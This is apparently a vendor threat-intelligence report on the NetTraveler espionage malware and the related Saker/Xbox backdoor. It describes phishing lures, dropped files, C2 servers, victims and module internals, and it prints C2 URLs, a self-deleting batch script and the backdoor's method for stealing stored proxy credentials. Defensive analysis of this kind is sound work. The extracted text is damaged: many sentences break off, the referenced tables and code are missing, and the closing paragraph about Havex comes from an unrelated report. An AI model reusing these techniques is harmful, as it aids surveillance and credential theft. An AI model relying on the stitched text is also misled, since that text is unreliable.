The name `` NetTraveler '' comes from an internal string which is present in early versions of the malware : `` NetTraveler Is Running ! '' .
This mal- ware is used by APT actors for basic surveillance of their victims .
Earliest known samples have a timestamp of 2005 , although references exist indicating activity as early as 2004 .
The largest number of samples we observed were created between 2010 and 2013 .
Known targets of NetTraveler ( also known as ' Travnet ' or `` Netfile '' ) include Tibetan / Uyghur activists , oil industry companies , scientific re- search centers and institutes , universities , private companies , governments and govern- mental institutions , embassies and military con- tractors .
The NetTraveler backdoor is often used together with other malware families .
During the anal- ysis of one of the command and control ( C & C ) servers , we observed how the attackers de- ployed different backdoors to the victims ' ma- chines .
These include the malware known as '' Saker '' also known as `` Xbox '' ( known filenames : '' update.exe '' , `` updata.exe '' or `` xbox.exe '' ) and '' PCRat '' / `` Zegost '' .
This report includes a full description of the `` Saker / Xbox '' backdoor as well .
The attacks use spear - phishing e - mails with malicious Microsoft Office documents as attach- ments .
Gathered data includes file system list- ings , keylogs , various types of documents ( .doc
We have calculated the amount of stolen data stored on C & C servers to be 22 + gigabytes .
However this data represents only a small frac- tion which we managed to see - the rest of the it had been previously downloaded and deleted from the C & C servers by the attackers .
Although these vulnerabilities have been patched by Microsoft , they remain effective and are among the most exploited in targeted attacks .
During our analysis , we did not see any advanced use of zero - day vulnerabilities or other malware techniques such as rootkits .
It is therefore surprising to observe that such un- sophisticated attacks can still be successful with high profile targets .
We are listing below several NetTraveler spear - phishing examples observed during the course of this investigation This spear - phish targeted CVE-2010 - 3333 , a very popular vulnerability exploited in many attacks .
The development of this version of the exploit delivers a large , easily identified '' 0x4141 '' NOP sled prior to its shellcode , shed- ding some light on the immaturity of the devel- opment behind the effort .
More interesting is that the target in India received this file titled '' Army Cyber Security Policy 2013.doc '' , and the accompanying benign and empty decoy Word document is dropped to the temp folder and opened with Word as `` Jallianwala Bagh massacre a deeply shameful act.doc '' ( MD5 : e617348b8947f28e2a280dd93c75a6ad ) .
The exploit drops > > % temp % \netmgr.dll > > % temp % \netmgr.exe > > % temp % \perf2012.ini > > % temp % \sysinfo2012.dll > > % temp % \winlogin.exe The malware command and control server script is at `` hxxp : //www.faceboak.net/2012nt/ nettraveler.asp '' .
Filename : `` invitation.doc '' Decoy filename : `` mailnew.doc '' ( empty ) Drops : > > % temp % \netmgr.dll > > % temp % \netmgr.exe > > % temp % \perf2012.ini > > % temp % \enumfs.ini > > % temp % \dnlist.ini > > % temp % \sysinfo2012.dll > > % temp % \winlogin.exe Filename : `` Report - Asia Defense Spending Boom.doc '' Decoy filename : `` Report -- Asia Defense Spend- ing Boom.doc '' ( empty ) ( MD5 : e617348b- 8947f28e2a280dd93c75a6ad ) Drops : > > % windir % \system\config_t.dat > > % windir % \system32\enumfs.ini > > % windir % \system32\dnlist.ini > > % windir % \system32\Iasex.dll > > % windir % \system32\system_t.dll E - mail spear - phishing sample entitled `` His Holi- ness the Dalai Lama 's visit to Switzerland day 4 '' .
Attachment filename : `` His Holiness the Dalai Lama 's visit to Switzerland Day 3.doc '' Decoy filename : `` His Holiness the Dalai Lama 's visit to Switzerland Day 3.doc '' Drops : > > % AppData % \Adobe\netmgr.dll > > % AppData % \Adobe\netmgr.exe > > % AppData % \Adobe\perf2012.ini > > % AppData % \Adobe\sysinfo2012.dll > > % AppData % \Adobe\enumfs.ini > > % temp % \winlogin.exe Filename : `` BJP wo n't dump Modi for Nitish NDA headed for split.doc '' Decoy filename : `` BJP wo n't dump Modi for Nitish NDA headed for split.doc '' Drops : > > % AppData % \Adobe\netmgr.dll > > % AppData % \Adobe\netmgr.exe > > % AppData % \Adobe\perf2012.ini > > % AppData % \Adobe\sysinfo2012.dll > > % AppData % \Adobe\enumfs.ini > > % temp % \winlogin.exe Filename : `` Activity Details.doc '' Decoy filename : `` Activity Details.doc '' ( empty ) Drops : > > % AppData % \Adobe\netmgr.dll > > % AppData % \Adobe\netmgr.exe > > % AppData % \Adobe\perf2012.ini > > % temp % \winlogin.exe files .
Filename : `` Fax13 - 0417.doc '' Decoy filename : `` Fax13 - 0417.doc '' ( empty ) Drops > > % AppData % \Adobe\netmgr.dll > > % AppData % \Adobe\netmgr.exe > > % AppData % \Adobe\perf2012.ini > > % AppData % \Adobe\sysinfo2012.dll > > % AppData % \Adobe\enumfs.ini > > % temp % \winlogin.exe Filename : `` The Prayer.doc '' Decoy filename : `` Freedom of Speech.doc '' ( empty ) Drops > > % AppData % \Adobe\netmgr.dll > > % AppData % \Adobe\netmgr.exe > > % AppData % \Adobe\ie.log > > % AppData % \Adobe\perf2012.ini > > % temp % \winlogin.exe Filename : `` 23948-report.doc '' Decoy filename : `` Report.doc '' ( empty ) Drops > > % AppData % \Adobe\netmgr.dll > > % AppData % \Adobe\netmgr.exe > > % AppData % \Adobe\enumfs.ini > > % AppData % \Adobe\perf2012.ini > > % temp % \winlogin.exe Filename : `` Alban Tushaal Jagsaalt.doc '' Decoy filename : `` document.doc '' ( Mongolian text ) Drops > > % temp % \smcs.exe > > % windir % \system\config_t.dat > > % windir % \system32\6to4ex.dll > > % windir % \system32\svchost.log Filename : `` data.xls '' ( empty decoy ) Drops : > > % temp % \enumfs.ini > > % temp % \sysinfo2012.dll > > % temp % \dnlist.ini > > % temp % \netmgr.dll > > % temp % \perf2012.ini > > % temp % \netmgr.exe NetTraveler is an automatic data exfiltration tool , designed to extract large amounts of private information from the victim 's system over long periods of time .
The malware uses compression techniques and a fail - safe protocol to ensure that uploaded data is safely transferred to the attacker 's C2s .
By default , NetTraveler exfiltrates common file types such as DOC , XLS , PPT , RTF and PDF .
For a full list , see the detailed backdoor analysis below .
The backdoor configuration can however be extended with special options to steal other file types .
Here 's one such extended configura- tion recovered from an attack against a victim working in the oil industry : It is clear that the attackers are also collecting files of type `` .cdr
The various parameters of the malware are configured with a builder , which allows the attackers to change things such as the list of stolen files extensions , C2 address and so on : Exfiltrated data is encoded with a custom compression and encoding library , which pro- duces files which resemble BASE64 .
The data is transferred to the command and control servers via HTTP requests such as : Note : for our analysis of the Red October cam- paign , see : https : //www.securelist.com / en/ blog/785/The_Red_October_Campaign_An _ Advanced_Cyber_Espionage_Network_Target- ing_Diplomatic_and_Government_Agencies During our analysis of NetTraveler infections , we identified several victims that were infected both by NetTraveler and Red October .
Although we see no direct links between the NetTraveler attackers and the Red October threat actor , the existence of victims infected by both of these campaigns is interesting .
These victims are : > > A Military Contractor in Russia > > An Embassy in Iran > > An Embassy in Belgium > > An Embassy in Kazakhstan > > An Embassy in Belarus > > A Government entity in Tajikistan These infections indicate that certain high profile victims are targeted by multiple threat actors ; the target information is a valuable commodity .
To better identify core NetTraveler actors and delineate the groups from one another , we collect and categorize various Tactics , Techniques , and Procedures ( TT Ps ) employed by these adversaries throughout their operations .
The attacker 's IP operation ranges , overlaps with that of a malware family known as `` Zegost '' .
For instance , one of the command and control servers that is part of the infrastructure , is a well - known C2 for multiple Zegost variants , still active as of May 2013 .
The targets and command and control domain naming scheme indicates a connection between the Lurid / Enfal attackers and NetTraveler .
Some of the NetTraveler C2 's are used to distribute a malware known as `` Saker '' or `` Xbox '' , which is delivered as an `` update '' to the NetTraveler victims .
Note : more details about the connections between NetTraveler and other campaigns is available in our private report .
Contact us at intelreports @ kaspersky.com for more details .
During our monitoring period , we observed more than 100 command and control URLs , pointing to multiple servers in the United States , China and Hong Kong .
The command and control servers generally run IIS 6/7 , as the C2 backend is an ASP ( Microsoft Active Server Pages ) script .
To transfer stolen data from the command and control servers , the attackers use FTP on top of VPN connections through a server in the US hosted by Krypt Technologies .
The infrastructure is secured by allowing FTP access only to remote users coming from predefined IPs , including the VPN provider in the US .
During our investigation , we analyzed several hundred NetTraveler samples and configuration files , which use more than 30 different C & C serv- ers .
The list below includes the script names that we have seen on these servers and confirmed as malicious : All the known command and control servers perform the same basic functions - for a description of the supported functionality , see below .
The main function of Command and Control servers is to collect stolen data from the victims .
Stolen data is stored in the exact format it was sent from the victim 's PC , without any additional encoding or obfuscation .
Here 's a listing of how a folder storing stolen victim data could look on the C & C server : The uploaded data can be either a document file , a keylogger backlog or a system infor- mation profile .
Here 's how a decoded system information profile looks like : The system profile includes an IPCONFIG output as well as a list of user accounts in the machine .
If the malware install includes the `` NetPass '' module , a keylogger will silently collect all typed data , together with window names .
This produces logs like the following ( in decoded format ) : The command and control scripts implement several functions to communicate with the victim ; during our analysis , we observed four different generations of these scripts , with various degrees of complexity .
The main function of the C & C script saves stolen data to a folder in the C2 root , unless the request variable `` action '' is defined , in which case , it performs one of the following commands : The Command and control scripts reply to the victim with either `` Success : < size > '' or `` Fail ! `` , de- pending on the result of the operation .
In some cases , instead of the `` Fail '' string , a more de- tailed error is sent back to the victim , in Simpli- fied Chinese : Under normal operation , a victim can connect to the C2 every five seconds and upload chunks of data from the victim , until the entire file is successfully transferred .
In case of errors , the malware continues to send the data over and over , until they succeed .
During our analysis , we obtained infection logs from several command and control servers .
The logs , which go back as far as 2009 , show that the threat actors behind NetTraveler successfully infected more than 350 victims in 40 countries .
The following map shows the locations and profile of the victims : The following map lists the victim profiles by industries : In addition to the data from the Command and Control servers , we collected statistics regarding detections of NetTraveler from the Kaspersky Security Network .
The top 10 infected coun- tries as reported in KSN ( Kaspersky Security Network ) : Besides the C & C logs and KSN , we have also sinkholed two of the C & C domains used by NetTraveler : The data set collected so far from the sinkhole is relatively small and includes victims in Mongolia , South Korea and India .
We will continue to monitor the connections and over time , update this paper with more data as it becomes available .
Note : Taking into account that several other C & C servers exist for which we have no logs and the KSN coverage , we estimate the total number of victims worldwide to be around ~1,000 .
From the point of view of the victims , the most important part of any report is information on how to detect and eradicate the infections .
In addition to running a modern security suite ca- pable of detecting NetTraveler , things such as filenames or C2 IPs can be extremely useful to system administrators .
This part of the report includes : Detection names for the malware modules and related files : Kaspersky detection names for malicious documents with embedded exploits used in spear - phishing attacks : Spear - phishing samples MD5s : Malware modules : During our analysis , we describe NetTraveler , a malicious data exfiltration tool used by a me- dium - sized threat actor group from China .
The main targets of the group include government institutions , embassies , oil and gas industry , research institutes , universities , private com- panies , military contractors and activists .
The group 's domains of interest include space ex- ploration , nanotechnology , energy production , nuclear power , lasers , medicine and communi- cations between others .
Although not very advanced , the NetTtraveler attackers have successfully compromised hun- dreds of targets around the world , with the high- est number in Mongolia , India and Russia .
The group using NetTraveler is also employing other malware , including Zegost , Saker and oth- ers .
To compromise their victims , they rely on exploits for two popular vulnerabilities in Mic- rosoft Office .
Based on collected intelligence , we estimate the group size to about 50 individuals , most of which speak Chinese natively and has knowledge of English language .
By publishing this report we would like to raise awareness of all organizations and individuals who might become a victim of these attackers .
We would like to encourage people of all coun- tries to learn something from this report , check their systems and be prepared for potential fu- ture cyberattacks against them .
More information on attribution and victims will be available to selected parties , including lo- cal authorities of victim countries .
For details , please contact us at intelreports @ kaspersky .
The module is a Win32 PE executable file com- piled in Microsoft Visual C++ 6.0 .
Its main pur- pose is to drop a DLL file and register it as a sys- tem service .
The malware looks up a suitable service name from one of the values in the reg- istry .
This module also drops an INI - type file with the configuration that is later used by the NetTrav- eler backdoor .
Execution of the module starts with the creation of a system mutex object called `` INSTALL SER- VICES NOW ! '' .
If this mutex already exists the module quits to avoid duplicate instances of the same module from running .
After that , the module creates the configura- tion file named % WINDIR % \system\config_t.dat which is populated with the strings embedded in the body of the executable and encrypted with simple one - byte XOR ( 0x3E ) .
The config_t.dat is an INI - type file which contains the module configuration shown below : The WebPage parameter 's maximum length is 128 bytes and represents a URL for the Com- mand and Control server ( C & C ) .
The code of the function to dump the INI file is designed to process several cases .
There is 1 byte value for variable UP ( which stands for '' Use Proxy '' ) from section [ Other ] .
If that value is set to 1 ( absolute file offset 0x334 ) then the INI file section [ Other ] will be populated with the following values : The purpose of PS , PP , PU , PW , PF parameters is the following : The module then queries registry value at HKLM\SOFTWARE\Microsoft\Windows NT\\CurrentVersion\Svchost\netsvcs which is a multi - string type of value .
Then it iterates through the names of services in that value to find a special service name .
It must not be the '' 6to4 '' service and there must not be registry key HKLM\SYSTEM\CurrentControlSet\Ser- vices\ < servicename > .
On Windows XP services that match the de- scribed criterias are ( eg .
These names are different on other Windows OS and even depend on installed features or Service Packs .
The malware takes the first matching service name and uses it .
Right after that , the malware attempts to delete % WINDIR % \system32\ < servicename > ex .
The service is designed to be a Win32 shared process like svchost , autostarted by system service control manager during system boot .
That creates cor- responding system registry values in HKLM\ SYSTEM\CurrentControlSet\Services\ < ser- vicename > .
After that it saves to local directory and executes the following batch file ( net.bat ) : Note that < servicename > is replaced with the actual system service name that was previously found .
After that the module creates the C : \WIN- DOWS\system32\ < servicename > ex.dll file on disk and sets hard - coded file creation and last access date and time to `` 20:00 17 August 2004 '' .
The new file is then filled with data produced after decryption of the hard - coded data block .
The malware is Win32 PE DLL file compiled in Mi- crosoft Visual C++ 6.0 .
It has one export function ServiceMain which has the main functionality of the module .
This module has initial filename assigned during compilation : `` DLL.dll '' .
Upon start the module sets corresponding ser- vice status to `` Start_Pending '' and then imme- diately to `` Running '' .
It checks if system mutex named `` NetTravler Is Running ! '' exists and terminates if that is true .
Note : Other known mutexes used by variants of NetTraveler include : After that it opens % WINDIR % \system\con- fig_t.dat file and parses the following values : It creates a list of local paths in memory to work with later : If CheckedSuccess value from INI file equals 0 or does n't exist , the module will fetch additional con- figuration from the same INI file [ Other ] section : Next the module prepares some strings for test- ing the Internet connection : Ironically , the % TestURL % is a Microsoft web page about privacy , security and safety online ( last updated in January 2000 ) : After that with the help of WinInet API the mod- ule issues an HTTP GET request to % TestURL % ( see above ) and the following hardcoded HTTP header values : It sets other options such as proxy server ad- dress and port ( PS and PP values from INI file or attempts to find proxy settings automatical- ly ) , proxy username and password ( PU and PW values from the INI file ) , several connection timeouts limited with 60 seconds .
The module submits the request and reads the response of the server .
The response is stored in newly allocated memory block .
After that the malware appends debug output to the log file named < modulename > .log
The output messages are shown below : If the PS , PP , PU , PW parameters were not found the INI file or Autocheck value is set to 1 , the module attempts to find local proxy settings ac- cording to the procedure below .
First , the module lists contents of % PROGRAM- FILES % directory and appends the listing to the log file .
Then it opens IE history file of the current user ( History . IE5\index.dat ) parses it and appends the log with discovered logins / password saved in the the history file as a part of visited URLs .
After that the module logs current version of Internet Explorer .
Interestingly that the log file is appended with the following hard coded string : '' IE版本 : Internet Explorer `` , 版本 means `` ver- sion '' in Simplified Chinese .
The module reads IE version from HKLM\Soft- ware\Microsoft\Internet Explorer\Version reg- istry value .
Then it gets version of current OS , and again appends the result to the log file with some hard coded strings in it : '' 操作系统版本 '' which means `` version of oper- ating system '' in Simplified Chinese .
The malware is capable of interpretation of sys- tem minor / major code and recognizing the fol- lowing O Ses : It can also recognize type of OS : Professional , Server , Advanced Server and exact version and build numbers are also appended to the log file .
There were four different methods to find proxy configuration on the system according to the log file messages set in three functions .
One of the function ( method 2 ) was probably merged with another one ( method 3 ) in newer variant of the malware .
Method 1 : This is a straightforward attempt to connect to the test url , assuming that system - wide proxy settings are correct or no proxy is required to access the external website .
The URL for testing is http : //www.microsoft.com / info / privacy _ security.htm with the following header values : If the method succeeds the module appends received data from the URL to the log file and corresponding parameter is set in the INI file ( UP=0 ) .
If something fails the following message is ap- pended to the log file : `` Method1 Fail ! ! ! ! ! '' Method 2 and Method 3 : This method is used when the infected machine uses proxy server but the settings are not avail- able for local SYSTEM user .
A user working at the infected machine might have internet ac- cess and should have the required proxy server settings .
The malware list all processes running on the machine and locates process named `` EXPLOR- ER.EXE '' .
This process is a system shell which is normally running after local user successfully authenticates and logs in to the system .
The malware finds explorer process and obtains se- curity token which is later used to temporarily impersonate as local user and get proxy con- figuration with InternetQueryOptionA ( 0 , INTER- NET_OPTION_PROXY , ...
If the result contains proxy settings the malware gets them .
If for some reason local proxy set- tings were not found in current user profile , the malware attempts to double - check and opens IE settings in the registry .
The following registry values are checked : After that the malware first obtains the IE stored credentials .
It iterates through all stored local user secrets via CredEnumerateA and looks for those which start with `` Microsoft_WinInet _ '' and contain the address of the proxy server previ- ously obtained .
These secrets are decrypted with CryptUnprotectData API call .
Such call is possible only after impersonation as local user which is available for the malware running with local system privileges .
This method checks the first available password in the list of passwords from the system stored secrets .
Once the potential server , port , login and pass- word are obtained the malware makes a test query to the same URL : http : //www.microsoft .
If it succeeds the content of this page is appended to the log file with all details about the proxy server .
If the method fails it prints the following line in the log file : `` Method3 Fail ! ! ! ! ! '' Method 4 : This method is identical to Method 3 with just one difference : it checks the last available pass- word in the list of passwords from the system stored secrets .
Method X ( debug ) : There is also an unused method in the code with no internal number , which was most likely used to debug the application as it writes all interme- diate results to the log file , starting from string '' Get From IEOption ! '' or `` Get From Reg ! '' de- pending on the path of code execution .
If the malware failed to locate the proxy server it unregisters current malicious service by deleting corresponding registry keys in HKLM\System\ CurrentControlSet\ < servicename > \ and at- tempts to delete all related files from the fol- lowing list : Otherwise , if the proxy was checked successful- ly the malware writes the following value to the config file ( config_t.dat ) : After that the module sleeps for 60 seconds and starts a new thread ( see below Thread1 ) , sleeps 10 more seconds and creates another thread ( see below Thread2 ) .
Right after that it enters an infinite loop of doing nothing but sleeping which can be interrupted by a special value in global variable set by other threads .
Upon detecting this value the service routine ends which termi- nates the service execution .
Thread1 ( Command and Control Thread ) This thread starts from collecting local system information , including the following : This information is stored in a text buffer with Chinese comments like shown below ( transla- tion is added in red ) : Physical Memory : Total physical memory : * * * MB of available memory : * * * MB ( * * .
This file is read a moment later , compressed using a custom Lempel - Ziv - based algorithm , encoded with a modified Base64 encoding and uploaded to the C & C server using HTTP GET request of the fol- lowing format : If the file upload is successful , the module de- letes the `` system_t.dll '' file .
Please note that the serial number of current disk drive ( most likely it is drive `` C '' ) is used in HTTP query value hostid .
This identifier derived from the local filesystem is used later as a reliable identifier of current infected machine or simply BotId .
The Control Loop After that it enters control loop .
Every 10 minutes according to the DownCmdTime parameter val- ue in the config file , it sends HTTP GET request of the following format : The module expects server to reply `` Success '' .
If it does n't the module will try again in 10 minutes .
If the server was notified and confirmed receiv- ing the notification , the module reads stat_t .
Filesystem Scan The malware has a file enumeration routine , which gets the settings from dnlist.ini ( such as directory paths to process ) and launches a re- cursive directory search .
The output is saved to enumfs.ini file in the following format : After execution , this log file contains directories with all filenames and subdirectories .
Only di- rectory / file names are stored , with no addition- al data such as timestamps or size .
When the search is finished , the module saves current date to the dnlist.ini file and changes option ScanAll , see format below .
This is done to avoid recurrent scanning of the filesystem , which is normally a heavy process and might be noticed by local user or an administrator .
After scanning the local filesystem , enumfs .
This process is described below .
The module works with files described in dnlist .
It gets a list of file extensions that must be uploaded to the C & C first .
There is a default list of extensions ( value Types of section [ Oth- er ] ) that represent interest for the attackers : doc , docx , xls , xlsx , txt , rtf , pdf .
Then it gets file- total values from [ FileList ] section of dnlist.ini and iterates through every f < N > value , where N is a positive integer starting from 1 .
There are several tests applied to each file , be- fore it is uploaded to the server , including the following : If the file matches the criterias , then a unique file state identifier for that file is created , which is an MD5 hash of the following string : '' < Filename > < Year > - < Month > - < Day > < Hour > : < Minute > : < Second > : < Millisec- onds > '' .
The date and time values in the string before are obtained from the file last change time .
After that the module creates a name used for uploading the file to the server , which consists of the following : `` < Year > - < Month > - < Day > - < Hour > - < Minute > - < File state identifier , the MD5 > '' .
The time and date values are also taken from the file 's last change time .
This file is up- loaded to the C & C using the same procedure as used before for uploading other files .
After that , Thread1 attempts to upload a file called uenumfs.ini , which is created by the Thread2 .
The remote filename is set to the following `` UFileL- ist- < Month > < Day > - < Hour > < Minute > < Sec- ond > .ini
Next , the thread iterates through % TEMP % \ ntvba00.tmp\ directory and uploads every file located there .
The file names are preserved as they are .
Control Procedure Then , the thread issues a special HTTP GET re- quest to get next control instruction from the C & C .
This is done by accessing the following URI : Server response is converted to uppercase and analyzed .
There is defined set of responses ex- pected from the C & C server : This command simply uninstalls the malicious service from the registry and deletes locally cre- ated files .
This procedure starts from uninstalling current service , then it issues three HTTP GET requests to the C & C script URL : This procedure simply removes all temporary files , such as the following : This procedure is identical to the UPDATE com- mand described before with one difference - no uninstallation of the current module is done , only new executable is downloaded and started .
This method is probably used to execute additional independent malicious executable , unrelated to the original NetTraveler malware .
Or it can be used to infect with the NetTraveler backdoor configured for some other C & C server .
After processing any of the commands above the malware issues the following request to the server to confirm command execution : If the server has n't issued the UNINSTALL com- mand the thread continues execution starting from the beginning of The Control Loop ( see above ) .
This thread creates a hidden window with class name `` NTMainWndClass '' and processes win- dow messages in a loop until it is interrupted by special variable value .
The window procedure processes only one window message , WM_DE- VICECHANGE with wParam value set to DBT _ DEVICEARRIVAL , which is sent by the system when a new removable device such as USB flash drive or Network shared folder is attached to the system .
The module will proceed only if the attached removable device has provided a disk volume .
It is designed to have different procedures for removable disk drives from USB flash and net- work shares .
The USB drives will be processed only if GSearch value is set to True in [ Other ] section of dnlist .
Similarly , a new network drive will be processed only if USearch value is set to True in [ Other ] section of dnlist.ini file .
Both network and removable USB drives are processed in the same procedure , which reads the following values from dnlist.ini file : If UAuto option is set to True , the thread creates % TEMP % \ntvba00.tmp\ directory and opens uenumfs.ini file for writing .
The latter is filled with directories and subdirectories listings of the attached disk drive .
The format of the data in uenumfs.ini is almost identical to the one created during fixed drive filesystem scan ( see `` Filesys- tem Scan '' part in Thread1 description above ) .
In addition to that , the same criterias are applied to each file ( size and file extension ) as in fixed drive filesystem scan .
Also , every file gets a state i d calculated as MD5 hash of the filename and timestamp of the last modification .
This hash is used to generate a new filepath in the follow- ing format : % TEMP % \ntvba00.tmp\ < Year > - < Month > - < Day > - < Hour > - < Minute > - < File state i d , MD5 hexadecimal string > .
The source file from newly attached drive is then copied to the destination set by the generated file path .
Please note , that the file orig- inal extension is preserved , while the file name is changed .
That is used to prevent further problems when working with unsupported encoding .
At the same time when file is copied to ntvba00 .
To avoid excessive use of the disk drive and oc- casional interest of the local user , the file copy- ing procedure has a delay .
Every 1000 files the thread delays execution and sleeps for 9 sec- onds .
Useless text transformation In function which gets disk volume serial num- ber the actual serial number is converted from a decimal integer to a hexadecimal number stored as an ASCII string .
The integer is converted to a string with call to the `` sprintf ' function and '' % 8X '' parameter which outputs 8 characters representing a number in hexadecimal form .
Despite the fact that the output of this call is in uppercase , the author of the module converts the output to uppercase characters again .
This could be due to the fact that the author used to have `` % 8x '' format string before , which made such conversion rational .
However , that clearly shows that the developer was n't aware of vari- ous format strings options , which shows lack of experience in C / C++ development .
Drive monitoring disk processing issue As we mentioned above the drive monitoring thread uses the same function to process removable USB drives and network shares attached as local drives .
Visible separation of these two types of disk drives ( in the name of the options GSearch and USearch , where `` U '' probably stands for `` USB '' and `` G '' is for `` Glob- al '' , and in separate logical branches of code flow ) is later misused , as the drive processing routines is bound to USB drives .
At least it read U - prefixed options from dnlist.ini file , which logically corresponds to the USB - type of disk drive , but used for both .
While this is a minor issue and probably did n't cause a serious problem for the attackers , this shows that the developer felt lazy at some point and used Copy and Paste approach to avoid creating extra code .
It could also mean that one part of the code was created by one person and later modified by another , who mistakenly over- looked general code design .
Data decompression routine The malware uses a custom data compres- sion algorithm when uploading files to the C & C server .
While the decompression is not required for the work of the application , the code for the decompression routine was also found in the malicious module .
This clearly indicates a design flaw and shows that the de- veloper did n't review the code on a binary level after it was compiled , which is common among beginners among malware authors and quite widespread among common software develop- ers .
Al- though no encryption or compression is used to protect or hide parts of the code , simple obfus- cation is applied to internal strings .
The module main purpose is to install and embedded DLL file or load it during system startup .
Execution of the main function starts with ob- taining local user Startup directory .
This path is appended with `` \service.lnk '' .
The strings , which are used in the application are stored in simple obfuscated form .
For example , the `` Kaspersky Lab '' is stored as `` K.sp4r6ky aa , '' .
The 1 , 4 , 6 , 10 and 12 characters are re- placed with hardcoded character constants as shown below : Then the module gets local % TEMP % folder path and constructs paths `` % TEMP % \service.dll '' and `` % TEMP % \service.exe '' .
After that the code checks if the current module file name is called `` service.exe '' .
If current module is not called `` service.exe '' , the module copies itself to `` % TMP % \service .
The executable file is as- signed an attribute `` hidden '' and started in a new process .
Then the module checks if Kasper- sky products are installed on local system by iterating through % PROGRAMFILES % directory and looking for `` Kaspersky Lab '' subdirectory .
If it finds Kaspersky products it quickly exits , if not it attempts to self - delete by running `` cmd.exe /c del < ModuleName > '' and then exits .
If the module was already installed in the system and is called `` service.exe '' , it checks if system mu- tex object called `` SECUT ! '' already exists and exits if it 's true .
This is done to avoid multiple instances of the module from running simultaneously .
After that , the module creates a new file at '' % TEMP % \service.dll '' and saves a part of own data to the new file .
The data offset is hardcoded as a string `` 46592 '' .
Next , it attempts to load the `` % TEMP % \service .
After that the module enters an infinite sleep loop . ' The module is a non - packed Win32 DLL exe- cutable file compiled in Microsoft Visual C++ 6.0 .
Although no encryption or compression is used to protect or hide parts of the code , simple obfuscation is applied to internal strings .
The module is to clearly a backdoor application that enables an attacker to manage files , get infor- mation about local disk drives , download and start new executables .
This backdoor is probably authored by the same developer who created the Gh0st / Zegost RAT .
This module has 2 export functions : JustTemp- Fun and ServiceMain .
Module main function as well as ServiceMain are empty procedures .
So far , all functionality of the module is located in JustTempFun function .
Meanwhile , there is another known malicious DLL which has exactly these export names - Gh0st RAT , that was also developed by Chinese .
When this module is loaded with Xbox Loader described above execution is started with Just- TempFun exported function .
This function begins with deobfuscation of the strings used further : pitgay.minidns.net 8090BBBBBBBBBBBB GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG SakerEvent FFFFFFFFFFFFFFFF Proxy HHHHHHHHHHHHHHHH Obviously pitgay.minidns.net is the C & C server domain name .
As for the `` GGG ...
The `` HHH ...
The thread collects information about the local system , such as > > OS version > > CPU type > > Used and available memory > > Local system name > > Used and available disk space of the drive C : \ The last value is converted to a hexstring of 8 characters and XOR - ed with current computer name .
The purpose of this value is unclear .
Then the information collected before is encrypt- ed using simple string obfuscation algorithm , shown below in a pseudo code : This algorithm not only adds obfuscation but also adds some redundancy , which doubles the size of the input string .
The module attempts to connect to a C & C server and issue using the following URL : http : //pitgay.minidns.net:8090/3010 ...
Also , it uses a hardcoded User - Agent string .
There is not query string parameters , the data is transferred in a form of CGI path consisting of hex numbers only and prefixed with 3010 , which makes such requests rather unique .
Here is how a request may look : GET /301000000000F0FD ...
The first DWORD ( ParamA ) defines the command and following execution path .
Below is the inte- ger values and commands description : 1020 : Shutdown 1021 : Shutdown Both 1020 and 1021 commands are used to interrupt execution of the module and terminate the main thread .
The module also sets local thread privileges to enable global system shut- down , however this is not used later and proba- bly represents some remains of the code written earlier or another variant of the code .
This is also confirmed by by the shutdown procedure exe- cuted afterwards , which is designed to disable Windows hook mechanism while it was n't used previously anywhere in the code .
It attempts to create a local batch file named del.bat with the following contents and run it : @ echo off ping /n 5 127.0.0.1 > nul > nul del /f / s / q / a < CurrentModuleDir > \service.exe > nul del /f / s / q / a < CurrentModuleDir > \service.dll > nul del % 0 /s / q / a / f del.bat Please note non - standard way to call Windows command line interpreter which starts from re- direction of output to NUL virtual device .
Also , the command arguments are not separated with space or tab characters , and it might look invalid , however cmd.exe on Windows XP , Windows 7 and Windows 8 executed it correctly without a problem .
The new thread makes 2 HTTP Get requests to the server , which are identical to the 3010 request described above .
The only difference is the request ID , which is 4001 and 4002 for the first and second requests correspondingly .
The output of the 4001 request is ignored , while request 4002 is interpreted .
The server response contains 2 DWORD values : lets call them FileCmdId and DataSize .
The FileCmdId defines which operation must be executed .
It can be one of the following values : 5001 : Get drive information .
Provides informa- tion about specified disk drive : free space , drive type .
Client command success code is 0 , error code is 7004 .
Provides information about specified file : file times , attributes .
Client command success code is 0 , error code is 7003 .
Provides information about specified directory : directory times , attributes , full size .
Client command suc- cess code is 0 , error code is 7003 .
Provide simple di- rectory listing , which includes file names , sizes , last write time .
Client command success code is 0 , error code is 7001 .
Create a new directory , which full path is provided by the server .
Client command success code is 0 , error code is 7016 .
List available disk drives with information about free space .
Client command success code is 0 , error code is not defined .
Run local application with path and command line arguments passed from the server .
Client command success code is 0 , error code is 7005 .
Provide recursive directory listing .
Client command suc- cess code is 0 , error code is 7000 .
This command is used to save file pushed by the server and run instantly .
When this command is received the module checks if it can create a new file , which name is passed by the server response .
If it fails it submits error code 7003 .
Then it spawns a new thread which issues a new HTTP Post request with command i d 3005 and system in- formation attached in the CGI Path .
The request of the server should contain file data to write to the already opened file and execute right away .
The command is used to read local file and transfer it to the server .
It gets file information , including time- stamps and size and spawns a new thread .
If any of those operations fails the module reports er- ror code 7003 to the server .
Otherwise it reports success code 0 and spawns a new thread .
The new thread reads the file specified in the request and uploads it to the server .
The module uses ParamB as an integer value indicating a length of a string to read next from the server response .
The received string will be used as a NewFilename .
Then it reads another DWORD value from the server response and interprets it as a size of the following data to read .
After that a new directory `` Internet Ex- plorer '' is created in the directory of the current running module .
Then the module creates a new file using the value NewFilename pushed by the server .
The module makes 2 attempts to start a new process : by calling CreateProcessA system API and ShellExecuteA if the previous call failed .
The code was designed to support more com- mands ( 1028 , 1029 , 1032 , 1033 , 1034 , 1035 , 1036 ) , however they are now falling into com- mand 1029 handler and then ignored .
We cre- ated a chart showing a tree of commands de- pendencies : The execution of this command processing thread continues in a loop until it is interrupt- ed by Shutdown command coming from the server .
The code starts new loop iteration after hardcoded value of 30 seconds .
C : \ProgramData\Mail\MailAg\scs.txt The 2nd stage modules are usually base64 encoded , bzip2 compressed and XORed using the recurrent `` 1312312 '' key .
In some cases , the malware can also use one 1024 bit RSA key which is embedded in the config section of the binary .
It seems there are over 50 different versions of Havex malware , internally identified by hex numbers from 01 to 044 ( the latest known at the time of writing ) .
Versions 01 – 019 : Contain strings that may be related to password harvesting , even though the code that would actually search for the passwords was not identified inside this component .
It 's possible that these strings are part of the configuration and are used by downloaded modules as a list of names of processes that the malware wants to hijack in order to steal passwords from the memory .
Versions 017 – 037 : Instead of the GET request , send a POST request to the C2 .
The contents of the POST differ between versions .
